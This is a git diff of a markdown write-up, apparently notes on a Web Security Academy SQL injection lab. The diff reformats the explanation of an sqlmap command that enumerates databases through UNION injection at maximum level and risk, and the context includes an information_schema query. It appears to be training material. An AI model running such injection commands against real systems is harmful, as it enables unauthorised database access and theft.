@@ -123,15 +123,17 @@ SELECT column_name FROM information_schema.columns WHERE table_name='TableName'
 sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 --dbs --batch
 ```
 * Options: <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --proxy=http://127.0.0.1:8080 : Using BurpSuite proxy for debugging purposes <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -u : Target URL <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -p : Testable parameter <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --technique=U : SQL Injection technique to use. Here i'm using the UNION technique <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --threads : Maximum number of concurrent HTTP requests (default 1) <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --level : Level of test to perform (5 is MAX) <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --risk : Risk of test to perform (3 is MAX) <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dbs : Enumerate databases (schema) names <br/>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --batch : Never ask for user input, use the default behavior <br/>
+```
+       --proxy=http://127.0.0.1:8080            - Using BurpSuite proxy for debugging purposes
+       -u                                       - Target URL
+       -p  					- Testable parameter
+       --technique=U                            - SQL Injection technique to use. Here i'm using the UNION technique
+       --threads                                - Maximum number of concurrent HTTP requests (default 1) 
+       --level                                  - Level of test to perform (5 is MAX) 
+       --risk                                   - Risk of test to perform (3 is MAX)
+       --dbs                                    - Enumerate databases (schema) names
+       --batch                                  - Never ask for user input, use the default behavior
+```
 
 * Execution:
 ![SQLMap_1](https://user-images.githubusercontent.com/101610095/220312739-645d4223-81ca-4ef9-b413-977a79cdf9ce.png) <br/>
